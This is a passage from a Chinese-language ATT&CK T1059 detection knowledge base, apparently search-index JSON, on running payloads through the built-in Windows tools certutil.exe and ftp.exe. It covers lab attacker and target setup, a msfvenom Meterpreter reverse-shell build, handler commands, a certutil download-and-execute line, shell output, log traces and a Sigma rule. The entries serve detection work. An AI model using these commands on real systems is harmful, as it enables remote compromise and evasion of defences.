shell.exe","title":"\u751f\u6210payload.exe"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:1234","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#http","text":"root@12306Br0:~# python2 -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ...","title":"\u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe & shell.exe","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"[*] Started reverse TCP handler on 192.168.126.146:1234 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49172) at 2020-04-17 15:59:50 +0800","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"#sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xbcc \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\certutil.exe #windows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u7cfb\u7edf\u53ef\u4ee5\u914d\u7f6e\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#sigma","text":"title: \u53ef\u7591\u7684Certutil\u547d\u4ee4 status: experimental description: \u4f7f\u7528\u8bf8\u5982\u201cdecode\u201d\u5b50\u547d\u4ee4\u4e4b\u7c7b\u7684\u5b50\u547d\u4ee4\u68c0\u6d4b\u53ef\u7591\u7684Microsoft certutil\u6267\u884c\uff0c\u8be5\u5b50\u547d\u4ee4\u6709\u65f6\u7528\u4e8e\u4f7f\u7528\u5185\u7f6e\u7684certutil\u5b9e\u7528\u7a0b\u5e8f references: - https://twitter.com/JohnLaTwC/status/835149808817991680 - https://twitter.com/subTee/status/888102593838362624 - https://twitter.com/subTee/status/888071631528235010 - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/ - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/ - https://twitter.com/egre55/status/1087685529016193025 - https://lolbas-project.github.io/lolbas/Binaries/Certutil/ logsource: category: process_creation product: windows detection: selection: CommandLine: - '* -decode *' - '* /decode *' - '* -decodehex *' - '* /decodehex *' - '* -urlcache *' - '* /urlcache *' - '* -verifyctl *' - '* /verifyctl *' - '* -encode *' - '* /encode *' - '*certutil* -URL*' - '*certutil* /URL*' - '*certutil* -ping*' - '*certutil* /ping*' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1140 - attack.t1105 - attack.t1059 - attack.s0189 - attack.g0007 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002 \u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\ftp.exe C:\\Windows\\SysWOW64\\ftp.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\ftp.exe C:\\Windows\\SysWOW64\\ftp.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.exe msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit \u6267\u884cpayload ftp>!C:\\Users\\12306Br0\\Desktop\\a\\payload.exe \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:53 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:53 -> 192.168.126.149:49219) at 2020-04-18 20:08:18 +0800 [*] Session ID 1 (192.168.126.146:53 -> 192.168.126.149:49219) processing AutoRunScript 'migrate -f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] [*] Current server process: payload.exe (2324) [*] Spawning notepad.exe process to migrate to [+] Migrating to 2888 [+] Successfully migrated to process meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 \u6d4b\u8bd5\u7559\u75d5 EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x474 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe EventID:4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x3f8 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\payload.exe EventID:5156 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 1016 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\payload.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49221 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 53 \u534f\u8bae: 6 EventID:1 #sysmon\u65e5\u5fd7 Image: C:\\Windows\\System32\\cmd.exe FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows Command Processor Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: C:\\Windows\\system32\\cmd.exe /C C:\\Users\\12306Br0\\Desktop\\a\\payload.exe CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500} LogonId: 0x550ac TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8 ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00} ParentProcessId: 1112 ParentImage: C:\\Windows\\System32\\ftp.exe ParentCommandLine: ftp \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/ \u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload https://www.77169.net/html/235306.html \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload s https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#t1059-win-ftpexepayload","text":"","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002 \u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\ftp.exe C:\\Windows\\SysWOW64\\ftp.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\ftp.exe C:\\Windows\\SysWOW64\\ftp.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#payloadexe","text":"msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe","title":"\u751f\u6210payload.exe"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"ftp>!C:\\Users\\12306Br0\\Desktop\\a\\payload.exe","title":"\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:53 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:53 -> 192.168.126.149:49219) at 2020-04-18 20:08:18 +0800 [*] Session ID 1 (192.168.126.146:53 -> 192.168.126.149:49219) processing AutoRunScript 'migrate -f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] [*] Current server process: payload.exe (2324) [*] Spawning notepad.exe process to migrate to [+] Migrating to 2888 [+] Successfully migrated to process meterpreter > getuid Server username: 12306Br0-PC\\12306Br0","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x474 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe EventID:4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x3f8 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\payload.exe EventID:5156 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 1016 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\payload.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49221 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 53 \u534f\u8bae: 6 EventID:1 #sysmon\u65e5\u5fd7 Image: C:\\Windows\\System32\\cmd.exe FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows Command Processor Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: C:\\Windows\\system32\\cmd.exe /C C:\\Users\\12306Br0\\Desktop\\a\\payload.exe CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500} LogonId: 0x550ac TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8 ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00} ParentProcessId: 1112 ParentImage: C:\\Windows\\System32\\ftp.exe ParentCommandLine: ftp","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/ \u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload https://www.77169.net/html/235306.html \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload s https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/","text":"T1059-windows-\u8fdb\u7a0b\u751f\u6210CMD \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u547d\u4ee4\u884c\u754c\u9762\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u8bb8\u591a\u7c7b\u578b\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u529f\u80fd\u3002windows\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u793a\u4f8b\u547d\u4ee4\u884c\u754c\u9762\u662f cmd 